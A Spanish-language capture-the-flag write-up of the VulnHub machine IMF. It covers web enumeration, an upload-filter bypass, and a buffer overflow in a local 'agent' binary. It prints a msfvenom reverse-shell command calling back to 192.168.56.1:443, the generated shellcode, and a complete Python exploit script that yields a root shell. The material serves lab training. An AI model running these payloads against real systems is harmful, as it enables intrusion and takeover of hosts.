---
layout: single
title: IMF - VulnHub
excerpt: "IMF es una máquina disponible en VulnHub que presenta una vulnerabilidad de carga de archivos, lo que permite la ejecución de código PHP. Posteriormente, la escalada de privilegios se basa en una vulnerabilidad de código que posibilita el desbordamiento del búfer, otorgándonos acceso a una shell como usuario root."
date: 2023-11-12
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)


IMF es una máquina disponible en VulnHub que presenta una vulnerabilidad de carga de archivos, lo que permite la ejecución de código PHP. Posteriormente, la escalada de privilegios se basa en una vulnerabilidad de código que posibilita el desbordamiento del búfer, otorgándonos acceso a una shell como usuario root.


## Enumeracion

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```python
# Nmap 7.93 scan initiated Tue Oct 24 19:15:07 2023 as: nmap -sCV -p80 -oN vulnscan.nmap 192.168.56.12
Nmap scan report for 192.168.56.12
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
MAC Address: 08:00:27:E4:BE:33 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 24 19:15:19 2023 -- 1 IP address (1 host up) scanned in 12.22 seconds
```

## Analisis 

Al explorar el sitio web y analizar su contenido, notamos que en *http://192.168.56.12/contact.php* se encuentran dos tipos de "flags" que proporcionan información para avanzar en la resolución de la máquina. Apreciamos una de ellas.

![](/assets/images/vulnhub-writeup-IMF/IMF-flag-imf.png)

Observamos la última.

![](/assets/images/vulnhub-writeup-IMF/IMF-flag1.png)

Decodificamos el texto en base64 y procedemos a ver su contenido.

![](/assets/images/vulnhub-writeup-IMF/IMF-decode-flag-base64.png)

La segunda "flag" nos sirve para ingresar en un directorio de la web.

![](/assets/images/vulnhub-writeup-IMF/IMF-userLogin.png)


Al momento de analizar diferentes inyecciones para baipasear el login, no obtenemos nada, por lo tanto, procedemos a realizar un fuzzing.

```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.12/imfadministrator/FUZZ -e .php,.txt,.html -t 200 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.12/imfadministrator/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 337, Words: 32, Lines: 7, Duration: 17ms]
images                  [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 2ms]
uploads                 [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 10ms]
cms.php                 [Status: 200, Size: 134, Words: 6, Lines: 9, Duration: 20ms]
.php                    [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 11ms]
.html                   [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 15ms]
                        [Status: 200, Size: 337, Words: 32, Lines: 7, Duration: 407ms]
:: Progress: [882184/882184] :: Job [1/1] :: 2019 req/sec :: Duration: [0:04:51] :: Errors: 0 ::
```

> Y no encontramos información alguna que nos sirva. Cuando esto sucede, es imprescindible enumerar más a fondo la página podemos iniciar por la página central o enumerando subdirectorios.

```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.12/imfadministrator/images/FUZZ -e .png,.jpg -t 200 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.12/imfadministrator/images/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .png .jpg 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

whiteboard.jpg          [Status: 200, Size: 58816, Words: 266, Lines: 220, Duration: 36ms]
```


Al ingresar a la imagen podemos observar que contiene un QR con el contenido de una "FLAG". Prodecemos a escanear el QR para ver su contenido.

![](/assets/images/vulnhub-writeup-IMF/IMF-flag-4IMF.png)

El contenido de esta "FLAG" informa de un archivo situado en la página web.

![](/assets/images/vulnhub-writeup-IMF/IMF-FLAG-LS.png)

 Al momento de intentar situar en la web un archivo PHP, nos lo prohíbe.Por lo tanto procedo a realizar algún bypass de subida de archivos, pero no lo logramos.Por lo tanto hago un fuzzing, para ver que extensiones me permite subir.

![](/assets/images/vulnhub-writeup-IMF/IMF-UPLOD-FILEIMF.png)


Visualizamos que nos deja subir 3 extensiones jpg,gif y png. Procedemos a testear cada una de ellas. Y notamos que si agregamos la variable system del código php, nos interviene el WAF.

![](/assets/images/vulnhub-writeup-IMF/IMF-WAFF.png)

En consecuencia, procedemos a realizar un bypass.

![](/assets/images/vulnhub-writeup-IMF/IMF-tester.png)

Y obtenemos lo siguiente:

![](/assets/images/vulnhub-writeup-IMF/IMF-ejecuciónDecodigo.png)

Una vez dentro del sistema podemos observar una flag, que nos dice "agentservices"

![](/assets/images/vulnhub-writeup-IMF/IMF-dataservice.png)

Al interpretar la pista que hemos descubierto, dirigimos nuestra atención a los puertos abiertos del sistema, identificando un detalle que captura nuestro interés.


![](/assets/images/vulnhub-writeup-IMF/IMFPORT.png)

 Buscamos el binario

```bash
www-data@imf:/var/www/html/imfadministrator$ find / -type f 2>/dev/null | xargs grep --text -i -r "Agent ID :"
/usr/local/bin/agent:Agent ID : Invalid Agent ID Login Validated Exiting...Main Menu:1. Extraction Points2. Request Extraction3. Submit Report0. ExitEnter selection: %d
^C
www-data@imf:/var/www/html/imfadministrator$ 
```

Al momento de ejecutar el binario observamos que nos solicita una especie de "ID", por lo que utilizaremos "ltrace" para examinarlo a bajo nivel.

![](/assets/images/vulnhub-writeup-IMF/IMF-informacion.png)

La función "strncmp" realiza una comparación de cadenas, por lo que al ingresar 48093572, logramos acceder. Mientras exploramos las diversas opciones, destacamos algo intrigante: en la función 3, se produce un desbordamiento de búfer.


![](/assets/images/vulnhub-writeup-IMF/IMF-desbordamiento.png)


En este punto es conveniente descargarse el binario en su máquina para realizar un análisis mas exhaustivo. En esta ocasión utilizare la herramienta "hydra", para analizarlo.SI nos vamos a la función inicial "main", analizamos que se trata de un código de opciones, por lo tanto nos vamos a la función 3 que es la que nos interesa.

![](/assets/images/vulnhub-writeup-IMF/IMF-analisis.png)

Cuando analizamos la función vemos que tenemos un limite de input de 164 caracteres  por lo tanto al ingresar mas de permitido colisiona. También utiliza la función gets que es vulnerable a buffer overflow.


![](/assets/images/vulnhub-writeup-IMF/IMF-limites.png)

## Ataque Buffer Overflow 

Al realizar un ataque de buffer overflow hay que tener en cuenta un par de cosas, algunas de ellas son:

1. Chequear las protecciones del binario.
2. Chequear si hay aleatorización en la memoria.
3. Calcular la cantidad de caracteres para sobrescribir el eip.
4. Chequear si el sistema es de 32 o 64 bits.


Paso 1 - En esta ocasión utilizamos checksec para analizar las protecciones.Y vemos que no contiene ninguna.

![](/assets/images/vulnhub-writeup-IMF/IMF-checkeo.png)

Paso 2 - Para realizar este paso, tenemos que fijarnos que numero contiene el archivo /proc/sys/kernel/randomize_va_space . Al tener un 2 da a entender que si hay aleatorización en la memoria, pero como es un sistema de 32 bits no hay preocupación.

```bash
www-data@imf:/dev/shm$ cat /proc/sys/kernel/randomize_va_space
2
www-data@imf:/dev/shm$ 
```

Paso 3 - Para calcular la sobre escritura de EIP, utilizaremos gdb. Primero le vamos a decir que nos cree un par de caracteres aleatorios.

```bash
gef➤  patter create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
[+] Saved as '$_gef1'
gef➤  
```

Procedemos a correr el programa con "r", y en la opcion 3 depositamos el contenido.

![](/assets/images/vulnhub-writeup-IMF/IMF-TESTER.png)

De esta manera nos informa sobre cuantos caracteres hay que insertar para poder sobreescribir el $eip. 

![](/assets/images/vulnhub-writeup-IMF/IMF-gdp.png)

Paso 4- Ejecutando uname -a sabemos si es de 32 o 64 bits.

```bash
www-data@imf:/dev/shm$ uname -a
Linux imf 4.4.0-45-generic 66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
www-data@imf:/dev/shm$
```

Con estos datos en nuestro poder, avanzamos a la siguiente etapa. Para ejecutar comandos, es necesario contar con un shellcode y la cantidad precisa de caracteres para sobrescribir el EIP. Para lograrlo, creamos nuestro propio shellcode. 

```bash
➜  scripts msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443 -a x86 --platform linux -f python -b "\x00\x0a\x0d\x20"
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 479 bytes
buf =  b""
buf += b"\xb8\x2e\x27\xd9\x47\xda\xcb\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x12\x83\xc2\x04\x31\x42\x0e\x03\x6c"
buf += b"\x29\x3b\xb2\x41\xee\x4c\xde\xf2\x53\xe0\x4b\xf6"
buf += b"\xda\xe7\x3c\x90\x11\x67\xaf\x05\x1a\x57\x1d\x35"
buf += b"\x13\xd1\x64\x5d\x64\x89\xaf\x9c\x0c\xc8\xcf\x9f"
buf += b"\x77\x45\x2e\x2f\xe1\x06\xe0\x1c\x5d\xa5\x8b\x43"
buf += b"\x6c\x2a\xd9\xeb\x01\x04\xad\x83\xb5\x75\x7e\x31"
buf += b"\x2f\x03\x63\xe7\xfc\x9a\x85\xb7\x08\x50\xc5"
```

Sin embargo, nos enfrentamos a un inconveniente: nuestro shellcode consta de 95 caracteres, pero necesitamos alcanzar 168 para lograr sobrescribir el EIP.

![](/assets/images/vulnhub-writeup-IMF/IMF-testing.png)

Por qué elegir EAX? Porque representa la parte inicial del programa. ¿Y cómo realizamos el salto a EAX? De la siguiente manera:

![](/assets/images/vulnhub-writeup-IMF/IMF-movimiento.png)


```bash
import socket

##ShellCode -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443 -a x86 --platform linux -f python -b "\x00\x0a\x0d\x20"
ofsset = 168
buf =  b""
buf += b"\xba\xb9\xb4\x13\x62\xda\xd7\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x12\x31\x56\x12\x03\x56\x12\x83\x57"
buf += b"\x48\xf1\x97\x96\x6a\x01\xb4\x8b\xcf\xbd\x51\x29"
buf += b"\x59\xa0\x16\x4b\x94\xa3\xc4\xca\x96\x9b\x27\x6c"
buf += b"\x9f\x9a\x4e\x04\xe0\xf5\x89\xd5\x88\x07\xea\xd4"
buf += b"\xf3\x81\x0b\x66\x65\xc2\x9a\xd5\xd9\xe1\x95\x38"
buf += b"\xd0\x66\xf7\xd2\x85\x49\x8b\x4a\x32\xb9\x44\xe8"
buf += b"\xab\x4c\x79\xbe\x78\xc6\x9f\x8e\x74\x15\xdf"

start_eip = b"a"*(ofsset -len(buf)) # restammos la cantidad de bytes del shellcode para que sume las A que falta

payload = buf + start_eip + b"\x63\x85\x04\x08\n" #8048563 -> Como es de 32 bits hay que introducirlo al reves en formato bytes.

# Enviamos la data 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 7788))
s.send(b"48093572\n")
print(s.recv(1040))
s.send(b"3\n")
s.send(payload)
```

Una vez ejecutado en la máquina local tendriamos que tener una reverse shell como root :).
